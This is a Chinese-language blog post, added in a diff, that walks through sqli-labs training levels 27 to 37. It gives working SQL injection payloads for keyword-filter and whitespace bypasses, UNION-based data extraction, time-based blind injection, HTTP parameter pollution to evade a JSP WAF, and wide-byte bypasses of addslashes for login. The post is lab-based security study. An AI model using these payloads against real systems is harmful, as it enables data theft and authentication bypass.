@@ -1,0 +1,202 @@
+---
+layout: post
+title: SQL注入（十三）
+desc: ""
+keywords: ""
+date: 2016-11-17
+categories: []
+tags: []
+---
+
+<h2>Less-27 &amp; Less-27a</h2>
+
+<h3>Fuzz</h3>
+
+<pre class="lang:tsql decode:true">?id=uniunionon1'</pre>
+
+<blockquote>
+  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''union1'' LIMIT 0,1' at line 1
+</blockquote>
+
+<pre class="lang:tsql decode:true">?id=selselectect1'</pre>
+
+<blockquote>
+  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+</blockquote>
+
+<pre class="lang:tsql decode:true">?id=sElect1'</pre>
+
+<blockquote>
+  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''sElect1'' LIMIT 0,1' at line 1
+</blockquote>
+
+<h3>Payload</h3>
+
+<pre class="lang:tsql decode:true">?id=0'%0auniunionon%0asElect%0a1,2,3%0aor%0a'1'='1</pre>
+
+Less-27a同理，但换成了盲注，闭合方式变成了双引号
+
+<pre class="lang:tsql decode:true">?id=0"%0auniunionon%0asElect%0aversion(),database(),3%0aand%0asleep(10)%0aor%0a"1"="1
+</pre>
+
+<h2>Less-28 &amp; Less-28a</h2>
+
+<h3>Fuzz</h3>
+
+<pre class="lang:tsql decode:true ">?id=1')%0aor%0a('1')=('1</pre>
+
+是括号和引号闭合的，不知道为啥这题变成了盲注。明明应该是有回显注入的 =，=
+
+<h3>Payload</h3>
+
+<pre class="lang:tsql decode:true ">id=0%27)%a0union%a0select%a01,group_concat(email_id),3%a0from%a0emails%a0
+where%a0(%271%27=%271</pre>
+
+<h2>Less-29 &amp; Less-30</h2>
+
+Bypass a waf
+
+<h2>Fuzz</h2>
+
+这个比较诡异了，一开始并没有看到防火墙的存在，但去分析了一下源码发现原来是我打开姿势不正确……
+
+一直都是为了图方便用/Less-29/?id=1在搞，但是这个题目是想让你用/Less-29/login.php?id=1
+
+首先可以看到当id=1的时候是正常的，但当我们输入了一个引号的时候就被“世界上最好的防火墙”拦下来了
+
+<img src="http://oc42vgpoj.bkt.clouddn.com/less29_waf.png" />
+
+很容易发现各种特殊符号都被拦截下来了，貌似只能输入数字
+
+<h2>WAF</h2>
+
+很诡异的是查的资料都是JSP的WAF，而我的源码文件夹只有PHP文件，并且没有WAF的痕迹，在看完源码之后发现了一处
+
+<pre class="lang:php decode:true">$id1=java_implimentation($qs);&lt;br&gt;</pre>
+
+于是去其他地方翻，终于翻到了JSP的WAF。其实我现在做的这个练习是用PHP重写的，只是在PHP里面重现了JSP才会涉及的漏洞
+
+<pre class="lang:java decode:true ">&lt;%
+    String id = request.getParameter("id");
+    String qs = request.getQueryString();
+        
+    if(id!=null)
+    {
+        if(id!="")
+        {
+            try
+            {
+                String rex = "^\\d+$";
+              /**
+                *这里的正则表达式有点绕，第一个反斜线其实是放在字符串里面转义的，
+                *也就是说真正的表达式应该是^\d+$，^是开始位置，$是结束位置。
+                *意思是匹配所有的数字
+                */
+                
+                Boolean match=id.matches(rex);
+                // 这里开始判断，如果输入的是纯数字，则放行，略坑啊
+                if(match == true)
+                {
+                    URL sqli_labs = new URL("http://localhost/sqli-labs/Less-29/index.php?"+ qs);
+                    URLConnection sqli_labs_connection = sqli_labs.openConnection();
+                    BufferedReader in = new BufferedReader(
+                                            new InputStreamReader(
+                                            sqli_labs_connection.getInputStream()));
+                    String inputLine;
+                    while ((inputLine = in.readLine()) != null)
+                        out.print(inputLine);
+                    in.close();
+                }
+                else
+                {
+                    response.sendRedirect("hacked.jsp");
+                }
+            }
+            catch (Exception ex)
+            {
+                out.print("&lt;font color= '#FFFF00'&gt;");
+                out.println(ex);
+                out.print("&lt;/font&gt;");                
+            }
+            finally
+            {
+                
+            }
+        }
+</pre>
+
+<h3>HTTP Parameter Pollution</h3>
+
+这里涉及到了HPP漏洞（HTTP参数污染）
+
+当我们为HTTP提交多个重名的参数时，不同的服务器将对他们做出不同的解析。jsp页面会只取第一个参数带入，而php页面则会只取最后一个参数带入。
+
+我们看下面的两个实验结果（JSP的是我随便找的一个页面2333）
+
+JSP:
+
+<img src="http://oc42vgpoj.bkt.clouddn.com/less29_jsp_test1.png" />
+
+<img src="http://oc42vgpoj.bkt.clouddn.com/less29_jsp_test2.png" />
+
+PHP:
+
+<img src="http://oc42vgpoj.bkt.clouddn.com/less29_php_test1.png" />
+
+<img src="http://oc42vgpoj.bkt.clouddn.com/less29_php_test2.png" />
+我们分析可知，WAF是用JSP写的（相当于JSP吧），于是只有输入的第一个参数会被检测，而PHP里面会执行的则是最后一个参数，用这种方法能够绕过WAF
+
+<h3>Payload</h3>
+
+<pre class="lang:tsql decode:true">?id=1&amp;id=-1' union select 1,database(),version() +--+</pre>
+
+<img src="http://oc42vgpoj.bkt.clouddn.com/less29_bypass.png" />
+通关
+
+Less-30同理，不过换成了盲注和双引号闭合
+
+<pre class="lang:tsql decode:true ">?id=1&amp;id=1" or 1=1 +--+</pre>
+
+<h2>Less-32 &amp; Less-33</h2>
+
+Multi-bytes &amp; Bypass addslashes
+
+<h3>Fuzz</h3>
+
+在输入?id=1'后发现我们的单引号被加了一个反斜杠，转义了，不能实现他的功能。没有单引号我们无法闭合，所以需要把单引号放出来。
+
+<h3>Multi-bytes</h3>
+
+这一节其实在讲宽字节注入，首先说什么是宽字节。
+
+在ASCII码对应的128个字符，每个字符只占1字节。但世界上的语言众多，存在很多无法用1个字节描述的符号，这些符号会占用多个字节。比如UTF-16编码的符号，就占用2字节。
+
+而在addslashes()的判断过程中，只会一个字符一个字符的比对，如果存在处于黑名单的字符，就加上一个反斜杠。比如?id=1'送入判断方法中时，1会被放过，而'会被添加一个反斜杠，变成了1\'。在十六进制编码中，也就是把%31%27变成了%31%5c%27。
+
+当我们使用宽字节如%bf时，则是将%bf%27转化成%bf%5c%27。在MySQL中，可以接受宽字节的字符，于是会把%bf和%5c看成一个宽字节字符，于是就变成了(%bf%5c)(%27)。单引号被释放出来了
+
+<h3>Payload</h3>
+
+<pre class="lang:tsql decode:true ">?id=0%bf' union select 1,2,3 +--+</pre>
+
+<h2>Less-34</h2>
+
+Post类型的宽字节注入，同理
+
+<h3>Payload</h3>
+
+<pre class="lang:default decode:true ">uname=admin+%df%27 or 1=1 # &amp;passwd=123&amp;submit=Submit</pre>
+
+<h2>Less-35</h2>
+
+就！是！个！坑！根本不需要单引号
+
+<h2>Less-36</h2>
+
+同理
+
+<h2>Less-37</h2>
+
+<pre class="lang:tsql decode:true  ">uname=1%bf' or 1=1 # &amp;passwd=1&amp;submit=Submit</pre>
+
+&nbsp;
